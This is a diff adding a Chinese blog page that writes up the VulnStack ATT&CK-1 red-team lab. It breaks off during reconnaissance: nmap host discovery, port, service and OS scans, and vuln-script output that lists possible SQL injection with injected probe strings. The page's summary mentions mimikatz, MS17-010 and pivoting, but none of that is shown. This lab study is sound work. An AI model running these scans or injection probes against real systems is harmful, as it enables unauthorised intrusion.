@@ -1,0 +1,628 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="主机发现、端口扫描，服务探测，操作系统探测、nmap 漏洞库扫描、网站首页信息泄露、msf 渗透与信息收集、mimikatz 抓取密码、rdesktop 连接远程桌面、探测内网存活主机、msf 添加内网路由、EarthWorm 内网穿透、proxychains4 代理、msf 利用 MS17-010（永恒之蓝）漏洞、共享 C 盘利用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《VulnStack》ATT&amp;CK-1">
+<meta property="og:url" content="https://blog.lens-shrine.top/2024/01/29/WriteUp%EF%BC%9ACyber-Range/VulnStack/01.%20%E7%BA%A2%E6%97%A5-01/index.html">
+<meta property="og:site_name" content="镜坛">
+<meta property="og:description" content="主机发现、端口扫描，服务探测，操作系统探测、nmap 漏洞库扫描、网站首页信息泄露、msf 渗透与信息收集、mimikatz 抓取密码、rdesktop 连接远程桌面、探测内网存活主机、msf 添加内网路由、EarthWorm 内网穿透、proxychains4 代理、msf 利用 MS17-010（永恒之蓝）漏洞、共享 C 盘利用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/985c64c7b02a4217997ef1a39b9fd221.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/8207925012da444ca06c92043a4d8318.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/260fc50fa9fd4842869af1aac7c6b37c.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/0a7d81390e8a403082cc2a52be530f5a.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/2619282bd300497c9a7219c4d46b12bd.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/d08f9259818548a5b0dd68737350a64d.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/87fc5edc5b824957ad70e38dc87f93fb.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/3f562902956845e6b540e418f566bc80.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/94a7f56185094d428a88858e0cd2d5f1.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/1ba703aa9842432298eca474ccd8a499.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/2b05183280e442198083e452f5f60acb.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/186b5b759a794c83865e935ea89ccfe2.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/426068959bd141b984fb8a9fa3f4f65d.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/296d777e4d61471bbbfb570406fa90a6.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/90ab398cec0f4447a198fae6af1a46f9.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/34663b46163548768095e2e97d5fac37.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/fdb58d622ef24b2cb3a25f7df752bdcc.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/1d44837de40d43678091a877b8b3c90e.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/0b9490e5c3df47db8f75533134db473b.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/c56075db1d2b4f35bddd8427c14a838f.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/6ec6c5b480374c51873bd9d64659c81c.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/efa09528ad3146be967210bff3909e70.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/fdf3166411eb40ff882c4737bcf0e20c.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/911db063f1f14ac0b149803f01f55e61.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/defa7ba2994d406d8af2554589bb4b21.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/448a296041d0416a887a0fe4a812bc34.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/975e1ed2c29e485ca1b252e72e56eeee.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/51849e03ec9e467c8c63f76ebdc8f535.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/823c53d78ce1472cb24122c2c4cb7449.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/2de24d0db5784137b1be6f4b46e6656c.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/42a36b3ab9244e1c91f2ceb7f531aa89.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/d93f90f2093a459bb4a60c24bec8c800.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/b15d937d4a0a4da4a2ca24d4ec5f7ab6.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/c15d73b1a0ac4b2fb1254c88ddf55af3.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/fe52667546ea415fa8347db41517408a.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/53b7b58ffe644ff98f03ac835217b65d.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/3d08c8f05db54de98c8494cb80043fb1.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/6cd06443c2c742a88e6f37fbce50620b.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/2fd49e03b35b43b2b7498307e88b21cf.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/7cf2956e3f6f498a825aaf252358db61.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/d2e116b0131246faac1f702134d114fc.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/9ffd0a26dd1147f381435ce0427145f7.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/77783da544374435b7a17a397909aa41.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/26d27a24904c4fa98e31960e4eb3ae51.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/8093da86b9964f00ba13f6513e3bb540.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/98e318764362472492c5f8090a131404.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/4e122ba1fed34206af5a1117f9e63e52.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/c280ce6a38474bbfb44ab77a79316492.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/836cec1f167b42fbb322e6aee32f71a1.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/e7cab77a434a4e2ea5e8f166a37818f8.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/3dac8829a1fd4ef4a8fbda528d9904dc.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/cc868a8de4c4440abc2fe845562fae6c.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/8d51e56f8b9741218d87649648490117.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/fd18e75a3d284c64a8f83fbda7c1402a.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/db2515d54bec4d30b45d01bd9575b0c9.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/721bd044d3a44c988bc24c9752643069.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/ddab1a8a8c3e4c0caa2d753bd861b636.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/4da70592c5b042ac819373d7b7723372.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/832cad581aaf444ea459480175999f63.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/632c9f5d48194099a5c9c49cea4ba786.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/716be0a58e954c02b2b7a87c2c1db28e.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/e22ab59fb4cb4536bbb622b4b88adc2e.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/db598169a733451d98fe86effa717f86.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/64336efd0c72420db2cfdafbd65852c6.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/0148503498ab45a1a277bb81d5af0823.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/224bef2b73ee4a1fa4f64f26ba01d070.png">
+<meta property="og:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/4c76e83f33ad4375a01f4e79589f2801.png">
+<meta property="article:published_time" content="2024-01-29T06:53:49.000Z">
+<meta property="article:modified_time" content="2024-02-14T10:55:49.000Z">
+<meta property="article:author" content="镜坛主">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.lens-shrine.top/assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/985c64c7b02a4217997ef1a39b9fd221.png"><title>《VulnStack》ATT&amp;CK-1 | 镜坛</title><link ref="canonical" href="https://blog.lens-shrine.top/2024/01/29/WriteUp%EF%BC%9ACyber-Range/VulnStack/01.%20%E7%BA%A2%E6%97%A5-01/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":2},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"dark","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":true},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbtack"></i></span><span class="header-nav-menu-item__text">关于</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner" style="background: url(/images/backimg/SunsetClimbing.png) no-repeat center/cover;"><div class="header-banner-info"><div class="header-banner-info__title">镜 坛</div><div class="header-banner-info__subtitle">烛明香暗画楼深，满鬓青霜残雪思难任。</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">《VulnStack》ATT&amp;CK-1</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2024-01-29</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2024-02-14</span></span></div></header><div class="post-body"><p>@<a href="VulnStack">TOC</a></p>
+<hr>
+<blockquote>
+<p>VulnStack：红日安全 ATT&amp;CK 实战 - 红队评估系列打靶记录。<br>VulnStack 官网：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/" >http://vulnstack.qiyuanxuetang.net/vuln/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<blockquote>
+<p>攻击机为 Kali-Linux-2023.3-vmware-amd64。<br>Kali NAT IP：192.168.8.15。</p>
+</blockquote>
+
+        <h1 id="1：靶场信息"   >
+          <a href="#1：靶场信息" class="heading-link"><i class="fas fa-link"></i></a><a href="#1：靶场信息" class="headerlink" title="1：靶场信息"></a>1：靶场信息</h1>
+      <p>靶场地址：<br><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" >http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>靶场结构：</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/985c64c7b02a4217997ef1a39b9fd221.png" alt="在这里插入图片描述"></p>
+<p>内网网段：<code>192.168.52.0/24</code></p>
+
+        <h1 id="2：打靶"   >
+          <a href="#2：打靶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2：打靶" class="headerlink" title="2：打靶"></a>2：打靶</h1>
+      
+        <h2 id="2-1：情报收集-威胁建模"   >
+          <a href="#2-1：情报收集-威胁建模" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1：情报收集-威胁建模" class="headerlink" title="2.1：情报收集 &amp; 威胁建模"></a>2.1：情报收集 &amp; 威胁建模</h2>
+      <p><strong>主机发现</strong>：<br><code>nmap -sn 192.168.8.0/24</code></p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/8207925012da444ca06c92043a4d8318.png" alt="在这里插入图片描述"></p>
+<p>得到服务器 IP：192.168.8.168。</p>
+<p><strong>进行端口扫描、服务探测、操作系统探测</strong>：<br><code>nmap 192.168.8.168 -p- -sV -sC -O -oN nmap-scan.txt</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/att&amp;ck-1]</span><br><span class="line">└─# nmap 192.168.8.168 -p- -sV -sC -O -oN nmap-scan.txt</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-02 22:13 HKT</span><br><span class="line">Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 35.15% done; ETC: 22:15 (0:01:29 remaining)</span><br><span class="line">Nmap scan report for 192.168.8.168</span><br><span class="line">Host is up (0.00065s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br><span class="line">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 </span><br><span class="line">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br><span class="line">5357/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">MAC Address: 00:0C:29:69:9D:AD (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose|phone|specialized</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 8.1|Phone|Vista|2008|7 (92%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 8.1 R1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (92%), Microsoft Windows Embedded Standard 7 (92%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (91%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 (87%), Microsoft Windows Server 2008 R2 SP1 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 132.46 seconds</span><br></pre></td></tr></table></div></figure>
+
+<p>访问网站，直接泄露了 php 探针……</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/260fc50fa9fd4842869af1aac7c6b37c.png" alt="在这里插入图片描述"></p>
+<p>但其实网站首页应该是这个：<code>http://192.168.8.168/yxcms/</code></p>
+<p>访问网站首页，在公告处泄露了后台信息：</p>
+<p><img src="/../../../assets/WriteUp%EF%BC%9ACyber-Range/VulnStack/%E7%BA%A2%E6%97%A5-01/0a7d81390e8a403082cc2a52be530f5a.png" alt="在这里插入图片描述"></p>
+<p><strong>用 nmap 的漏洞库对端口进行扫描</strong>：<br><code>nmap 192.168.8.168 --script=vuln -p 80,5357 -oN nmap-vuln.txt</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Tue Jan  2 22:26:35 2024 as: nmap --script=vuln -p 80,5357 -oN nmap-vuln.txt 192.168.8.168</span><br><span class="line">Nmap scan report for 192.168.8.168</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_      http://ha.ckers.org/slowloris/</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|     http://192.168.8.168:80/l.php?act=Function%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.8.168:80/l.php?act=phpinfo%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.8.168:80/l.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.8.168:80/l.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.8.168:80/l.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.8.168:80/l.php?act=Function%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.8.168:80/l.php?act=phpinfo%27%20OR%20sqlspider</span><br><span class="line">|   Possible sqli for forms:</span><br><span class="line">|     Form at path: /, form&#x27;s action: /l.php#bottom. Fields that might be vulnerable:</span><br><span class="line">|       host</span><br><span class="line">|       port</span><br><span class="line">|       login</span><br><span class="line">|       funName</span><br><span class="line">|     Form at path: /l.php, form&#x27;s action: /l.php#bottom. Fields that might be 